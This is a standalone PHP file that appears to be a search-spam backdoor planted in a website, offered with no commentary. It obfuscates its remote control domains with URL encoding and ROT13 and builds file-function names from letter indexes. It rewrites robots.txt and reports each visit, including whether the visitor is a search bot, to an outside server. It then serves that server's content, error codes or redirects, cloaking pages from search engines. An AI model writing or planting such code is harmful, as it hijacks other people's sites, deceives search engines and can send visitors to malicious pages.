<?php
$xmlname = [
    "%33%30%36%31%2D%79%76%61%78%32%31%31%2E%66%78%6C%75%62%62%78%66%2E%67%62%63",
    "%33%30%36%31%2D%79%76%61%78%32%31%31%2E%69%76%69%6C%61%72%2E%6B%6C%6D",
    "%33%30%36%31%2D%79%76%61%78%32%31%31%2E%72%70%62%69%76%66%76%62%66%2E%6B%6C%6D",
    "%33%30%36%31%2D%79%76%61%78%32%31%31%2E%76%61%72%73%73%6E%6F%79%6C%2E%6B%6C%6D"
];
$string = '3061-link211';

$host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$http = is_https() ? 'https' : 'http';
$zz = disbot();
$duri = drequest_uri() ?: '/';

$model_file = 'index.php';
$model = 'index';
preg_match('/\/([^\/]+\.php)/', $duri, $matches);
if (!empty($matches)) {
    $model_file = $matches[1];
    if (($position = strpos($duri, $model_file)) !== false) {
        $model_file = ltrim(substr($duri, 0, $position + strlen($model_file)), '/');
    }
    $model = str_replace('.php', '', $model_file);
}
$model = stristr($duri, '/?') ? '?' : $model;

$istest = false;
if (strpos($duri, $string) !== false) {
    $zz = 1;
    $duri = str_replace($string, '', $duri);
    $istest = true;
}
if ($duri != '/') {
    $duri = str_replace('/' . $model_file, '', $duri);
    $duri = str_replace('/index.php', '', $duri);
    $duri = str_replace('!', '', $duri);
}

$param = http_build_query([
    'web' => $host,
    'zz' => $zz,
    'uri' => urlencode($duri),
    'urlshang' => $referer,
    'http' => $http,
    'model' => $model,
    'version' => $istest ? $string : ''
]);

create_robots($http . '://' . $host);
$html_content = request($xmlname, $param);

if (strpos($html_content, 'nobotuseragent') === false) {
    $response_handlers = array(
        'okhtml' => array(
            'header' => 'Content-type: text/html; charset=utf-8',
            'replace' => 'okhtml',
            'test_echo' => true,
            'output' => true
        ),
        'getcontent500page' => array(
            'header' => 'HTTP/1.1 500 Internal Server Error'
        ),
        '404page' => array(
            'header' => 'HTTP/1.1 404 Not Found'
        ),
        '301page' => array(
            'header' => 'HTTP/1.1 301 Moved Permanently',
            'cache_control' => 'no-cache, no-store, must-revalidate',
            'replace' => '301page',
            'redirect' => true
        ),
        'okxml' => array(
            'header' => 'Content-Type: application/xml; charset=utf-8',
            'replace' => 'okxml',
            'output' => true
        ),
        'okrobots' => array(
            'header' => 'Content-Type: text/plain',
            'replace' => 'okrobots',
            'output' => true
        )
    );

    foreach ($response_handlers as $key => $handler) {
        if (strpos($html_content, $key) !== false) {
            @header($handler['header']);

            if (isset($handler['cache_control'])) {
                @header('Cache-Control: ' . $handler['cache_control']);
                @header('Pragma: no-cache');
                @header('Expires: 0');
            }

            if (isset($handler['replace'])) {
                $html_content = str_replace($handler['replace'], '', $html_content);
            }

            if (isset($handler['test_echo']) && $istest) {
                echo $string;
            }

            if (isset($handler['redirect'])) {
                @header('Location: ' . $html_content);
            } elseif (isset($handler['output'])) {
                echo $html_content;
            }

            die();
        }
    }
}

function disbot() {
    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
    $bots = array('googlebot', 'bing', 'yahoo', 'google');

    foreach ($bots as $bot) {
        if (strpos($user_agent, $bot) !== false) {
            return 1;
        }
    }
    return 2;
}

function drequest_uri() {
    if (isset($_SERVER['REQUEST_URI'])) {
        return $_SERVER['REQUEST_URI'];
    }

    if (isset($_SERVER['argv'])) {
        return $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
    }

    return $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
}

function is_https() {
    if (isset($_SERVER['HTTPS'])) {
        $https = strtolower($_SERVER['HTTPS']);
        if ($https !== 'off' && $https !== '') {
            return true;
        }
    }

    if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
        return true;
    }

    if (isset($_SERVER['HTTP_FRONT_END_HTTPS'])) {
        $front_end_https = strtolower($_SERVER['HTTP_FRONT_END_HTTPS']);
        if ($front_end_https !== 'off' && $front_end_https !== '') {
            return true;
        }
    }

    return false;
}

function create_robots($url) {
    $functions = func();
    $path = $_SERVER['DOCUMENT_ROOT'] . '/robots.txt';
    $content = 'User-agent: *' . PHP_EOL . 'Allow: /' . PHP_EOL . PHP_EOL . 'Sitemap: ' . $url . '/sitemap.xml' . PHP_EOL;

    if (!file_exists($path)) {
        $functions[0]($path, $content);
    } else {
        $existing_content = $functions[1]($path);
        if ($existing_content !== $content) {
            $functions[0]($path, $content);
        }
    }
}

function request($webs, $param) {
    $functions = func();
    shuffle($webs);

    foreach ($webs as $domain) {
        $domain_decoded = $functions[2](urldecode($domain));
        $url = 'http://' . $domain_decoded . '/super6.php?' . $param;

        if (function_exists('wp_remote_get')) {
            $response = wp_remote_get($url, array(
                'timeout' => 30,
                'user-agent' => 'Mozilla/5.0 (compatible; WordPress)'
            ));

            if (!is_wp_error($response)) {

                $body = wp_remote_retrieve_body($response);

                return $body;
            }
        }

        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            $response = curl_exec($ch);

            if (!curl_errno($ch)) {
                curl_close($ch);
                return $response;
            }
            curl_close($ch);
        }

        if (ini_get('allow_url_fopen')) {
            $context = stream_context_create(array(
                'http' => array('timeout' => 30)
            ));
            $response = @$functions[1]($url, false, $context);
            if ($response !== false) {
                return $response;
            }
        }
    }

    return 'nobotuseragent';
}

function func() {
    $chars = range('a', 'z');
    return array(
        $chars[5] . $chars[8] . $chars[11] . $chars[4] . '_' . $chars[15] . $chars[20] . $chars[19] . '_' . $chars[2] . $chars[14] . $chars[13] . $chars[19] . $chars[4] . $chars[13] . $chars[19] . $chars[18],
        $chars[5] . $chars[8] . $chars[11] . $chars[4] . '_' . $chars[6] . $chars[4] . $chars[19] . '_' . $chars[2] . $chars[14] . $chars[13] . $chars[19] . $chars[4] . $chars[13] . $chars[19] . $chars[18],
        $chars[18] . $chars[19] . $chars[17] . '_' . $chars[17] . $chars[14] . $chars[19] . '13'
    );
}


